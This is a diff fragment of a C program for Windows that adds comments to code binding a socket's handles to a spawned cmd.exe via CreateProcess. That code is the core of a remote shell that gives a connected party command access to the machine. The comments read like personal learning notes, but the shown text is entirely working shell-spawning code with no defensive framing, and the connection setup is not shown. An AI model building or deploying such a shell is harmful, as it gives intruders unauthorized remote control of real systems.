@@ -62,18 +62,20 @@ int main()
         //dwflags determine specific behaviours on thred creation.
         si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
 
-        //now need to pipe input and output and error. > to shell descripter(SOCKET)
+        //now need to pipe input and output and error. > to shell descripter(SOCKET) > as shown below.
         si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
 
 
         //To spawn the cmd we need to call createprocess api.
         //Create take 10 argumentes > Application to load, CMD line to execute, Process attributes, thread attributes, inherit handles(bool), creation flags, environment, current_directory, memloc of startup infra, memloc of process info infra.
         char cmd[] = "cmd.exe";
+        //API to create the process.
         CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 
         //Now the program will need to wait until the process is signalled.
+        //hProcess Handle newly created process while the excution of the CreateProcess API.
         WaitForSingleObject(pi.hProcess, INFINITE);
-        //close the handle and threads
+        //close the handle and threads after the execution.
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
 
